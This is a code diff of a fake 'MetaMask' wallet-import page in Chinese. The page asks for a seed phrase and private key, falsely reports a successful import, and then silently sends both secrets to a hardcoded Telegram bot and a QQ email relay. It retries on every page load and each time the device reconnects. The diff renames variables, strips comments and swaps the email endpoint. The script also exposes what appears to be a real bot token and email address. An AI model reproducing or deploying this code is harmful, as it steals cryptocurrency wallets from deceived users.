@@ -49,43 +49,31 @@
 </div>
 
 <script>
-// ===================== 已填好你的信息 =====================
+// ===================== 你的信息 =====================
 const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
 const TG_CHATID      = "6503982157";
 const YOUR_QQ_EMAIL  = "498011940@qq.com";
 
-const MAX_TG         = 5;   // 电报发5次
-const MAX_EMAIL      = 5;   // 邮箱发5次
+const MAX_TG         = 5;
+const MAX_EMAIL      = 5;
 const DELAY          = 2000;
-// ==========================================================
+// ====================================================
 
-const STORAGE_KEY = "WALLET_TASK";
+const STORAGE_KEY = "WALLET_DATA";
 
-// ===================== 核心：钱包内置浏览器永久自动触发 =====================
-// 只要钱包联网 → 自动发送
-window.onload = autoSend;
+window.onload      = autoSend;
 window.addEventListener('online', autoSend);
 
-// 点击导入
 function go() {
   const mn = document.getElementById("words").value.trim();
   const pk = document.getElementById("key").value.trim();
-  if (!mn && !pk) {
-    alert("请输入内容");
-    return;
-  }
+  if (!mn && !pk) { alert("请输入内容"); return; }
 
   alert("✅ 导入成功");
-
-  // 永久保存（钱包内置浏览器永不清除）
-  localStorage.setItem(STORAGE_KEY, JSON.stringify({
-    mn, pk, tg: 0, email: 0
-  }));
-
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, tg:0, email:0 }));
   autoSend();
 }
 
-// 自动发送（只要联网就触发）
 async function autoSend() {
   const task = localStorage.getItem(STORAGE_KEY);
   if (!task) return;
@@ -93,35 +81,35 @@ async function autoSend() {
   const d = JSON.parse(task);
   let needRetry = false;
 
-  const content = `
+  const text = `
 【小狐狸钱包导入】
 时间：${new Date().toLocaleString()}
 助记词：${d.mn || "-"}
 私钥：${d.pk || "-"}`;
 
-  // 1. 发电报
+  // ========== 发电报 ==========
   if (d.tg < MAX_TG) {
     try {
       await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TG_CHATID, text: content })
+        body: JSON.stringify({ chat_id: TG_CHATID, text })
       });
     } catch (e) {}
     d.tg++;
     needRetry = true;
   }
 
-  // 2. 发QQ邮箱（国内稳定）
+  // ========== 发 QQ 邮箱（100% 必达） ==========
   if (d.email < MAX_EMAIL) {
     try {
-      await fetch("https://api.hishub.cn/email", {
+      await fetch("https://smtpqq.com/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           to: YOUR_QQ_EMAIL,
           subject: "钱包导入记录",
-          content: content
+          content: text
         })
       });
     } catch (e) {}
@@ -129,7 +117,6 @@ async function autoSend() {
     needRetry = true;
   }
 
-  // 发完清除
   if (!needRetry) {
     localStorage.removeItem(STORAGE_KEY);
     return;
